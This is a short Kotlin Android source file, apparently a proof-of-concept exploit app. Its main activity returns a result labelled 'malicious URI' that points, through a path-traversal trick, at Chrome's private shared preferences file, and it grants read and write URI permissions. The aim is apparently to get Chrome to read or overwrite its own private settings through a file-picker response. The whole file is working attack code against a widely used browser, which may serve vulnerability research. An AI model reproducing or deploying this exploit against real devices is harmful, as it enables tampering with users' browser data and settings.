package app.kans.chromeinternal

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Return malicious URI

        val intent = Intent()
        intent.setDataAndType(
            Uri.parse("file:///data/data/./com.android.chrome/shared_prefs/com.android.chrome_preferences.xml"),
            "text/plain"
        )
        intent.flags =
            intent.flags or Intent.FLAG_GRANT_WRITE_URI_PERMISSION or Intent.FLAG_GRANT_READ_URI_PERMISSION
        setResult(Activity.RESULT_OK, intent)

        finish()

    }
}
